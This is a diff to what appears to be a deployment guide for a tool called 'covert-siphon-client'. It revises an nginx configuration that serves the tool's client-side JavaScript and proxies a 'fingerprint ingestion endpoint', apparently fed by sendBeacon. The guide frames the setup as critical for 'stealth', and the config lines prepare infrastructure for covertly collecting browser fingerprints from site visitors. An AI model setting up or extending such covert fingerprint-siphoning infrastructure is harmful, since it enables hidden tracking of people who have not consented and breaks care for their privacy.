@@ -628,20 +628,26 @@ This is a **critical step** for full functionality and stealth. Your domain shou
         ssl_certificate /etc/letsencrypt/live/your-covert-server.com/fullchain.pem; # Managed by Certbot
         ssl_certificate_key /etc/letsencrypt/live/your-covert-server.com/privkey.pem; # Managed by Certbot
 
+        # **CRITICAL FILE PLACEMENT GUIDANCE**
         # Define the root directory for your static client-side files (index.html, JS, CSS etc.)
-        # **CRITICAL**: Update this path to where your 'covert-siphon-client' directory is located.
-        root /var/www/your-covert-server.com/html; # Example
-        index index.html index.htm;
+        # Place the entire 'covert-siphon-client' directory (containing index.html and the 'js' folder)
+        # into this location on your server's file system.
+        root /var/www/your-covert-server.com/html; # Example path. **UPDATE THIS TO YOUR ACTUAL PATH.**
+                                                   # For example, if 'index.html' is at /var/www/your-covert-server.com/html/index.html,
+                                                   # and 'pako.min.js' is at /var/www/your-covert-server.com/html/js/pako.min.js
 
-        # Serve static files from the root directory
+        index index.html index.htm; # Default file to serve when root is accessed
+
+        # Serve static files including index.html directly from the root directory
         location / {
-            try_files $uri $uri/ =404; # Serve index.html or other static files
+            try_files $uri $uri/ =404; # Attempts to serve the request URI, or a directory index (e.g., index.html), or returns 404
         }
 
         # Explicitly serve the pako.min.js from the js/ subdirectory
-        location /js {
-            alias /var/www/your-covert-server.com/html/js; # Path to your 'js' directory
-            try_files $uri =404; # Serve pako.min.js
+        # (This is technically covered by the above root location, but explicit for clarity)
+        location /js/ { # Note the trailing slash to match directory contents
+            alias /var/www/your-covert-server.com/html/js/; # Path to your 'js' directory. Also with trailing slash.
+            try_files $uri =404; # Serve JavaScript files within /js/
         }
 
         # Proxy requests for the fingerprint ingestion endpoint to your Node.js server
@@ -652,7 +658,7 @@ This is a **critical step** for full functionality and stealth. Your domain shou
             proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
             proxy_set_header X-Forwarded-Proto $scheme;
             proxy_http_version 1.1; # Required for keepalive
-            proxy_buffering off; # Prevents Nginx from buffering response from backend
+            proxy_buffering off; # Potentially better for sendBeacon
         }
 
         # Proxy requests for the client error logging endpoint
